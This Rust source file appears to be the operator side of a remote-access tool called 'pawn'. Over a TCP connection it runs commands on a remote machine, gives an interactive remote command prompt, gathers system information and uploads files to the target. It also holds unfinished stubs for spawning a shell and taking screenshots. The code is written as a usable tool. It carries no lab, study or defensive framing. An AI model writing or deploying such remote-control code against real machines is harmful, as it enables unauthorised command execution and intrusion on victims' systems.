use std::io::{Read, Write, stdin, stdout, Result};
use std::fs;
use crate::pawn::*;

fn setup_head(cmdt: CommandType, arg: String) -> Vec<u8> {
	let mut head: Vec<u8> = vec![(cmdt as u8)];
	head.extend(arg.as_bytes().iter());
	head
}

#[allow(unused_variables)]
pub fn _spawn_shell(stream: &mut TcpStream) { todo!() }
#[allow(unused_variables)]
pub fn _scrshot(stream: &mut TcpStream) { todo!() }

pub fn sysinfo(stream: &mut TcpStream) {
	let mut resp: [u8; 1024] = [0; 1024];
	let head = setup_head(CommandType::Exec, String::from("uname -a"));
	let (_,_) = (stream.write(head.as_ref()),
	             stream.read(&mut resp));

	let uname = String::from_utf8((&resp[..]).to_vec()).unwrap();
	let uname_vec = uname.split(" ").collect::<Vec<&str>>();
	println!("os: {}\nkernel: {}\narch: {}\nhostname: {}",
			 uname_vec[0], uname_vec[2], uname_vec[12], uname_vec[1]);
}

#[allow(unused_assignments)]
pub fn exec_cmd(stream: &mut TcpStream) {
	let mut recvbuf: [u8; RECV_BUFF_SIZE] = [0; RECV_BUFF_SIZE];
	let (mut sendbuf, mut cmdres) = (String::new(), String::new());
	let mut head: Vec<u8> = vec![];

	loop {
		print!("[{}:exec]=> ", "pawn");

		let (_,_) = (stdout().flush(),
					 stdin()
						.read_line(&mut sendbuf)
						.expect("[err] unable to read from stdin"));

		sendbuf = String::from(sendbuf.trim());
		if sendbuf == "exit" { break; }
		
		head = setup_head(CommandType::Exec, sendbuf);

		let (_,outsiz) = (stream.write(head.as_ref()),
							stream.read(&mut recvbuf).unwrap());

		cmdres = String::from_utf8((&recvbuf[..outsiz]).to_vec()).unwrap();
		println!("{}", cmdres.trim());

		sendbuf = String::new();
		recvbuf = [0; RECV_BUFF_SIZE];
	}
}

pub fn upload(source: &str, destination: &str, stream: &mut TcpStream) -> Result<()> {
	let imgdata = fs::read(source)?;
	let head = setup_head(CommandType::Upload, String::from(destination));
	let (_,_,_) =  (stream.write(head.as_ref()),
					stream.read(&mut [0u8; 8]),
				 	stream.write(&imgdata));
	Ok(())
}
